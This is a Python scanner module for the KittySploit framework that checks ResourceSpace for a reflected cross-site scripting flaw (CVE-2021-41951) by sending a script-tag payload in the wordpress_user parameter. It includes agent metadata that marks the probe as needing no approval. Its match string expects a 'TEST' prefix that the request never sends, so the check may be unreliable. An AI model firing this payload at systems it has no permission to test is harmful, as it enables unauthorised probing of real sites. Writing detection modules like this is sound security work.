#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ResourceSpace before 9."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Resourcespace - Cross-Site Scripting Detection',
        'description': 'ResourceSpace before 9.6 rev 18290 is affected by a reflected cross-site scripting vulnerability in plugins/wordpress_sso/pages/index.php via the wordpress_user parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'xss', 'resourcespace', 'montala', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.horizon3.ai/multiple-vulnerabilities-in-resourcespace/',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-41951',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/nvn1729/advisories',
        ],
        'cve': 'CVE-2021-41951',
    }

    def run(self):
        r = self.http_request(method="GET", path='/plugins/wordpress_sso/pages/index.php?wordpress_user=%3Cscript%3Ealert(1)%3C/script%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('TEST<script>alert(1)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Resourcespace - Cross-Site Scripting detected",
                path='/plugins/wordpress_sso/pages/index.php?wordpress_user=%3Cscript%3Ealert(1)%3C/script%3E',
            )
            return True
        return False

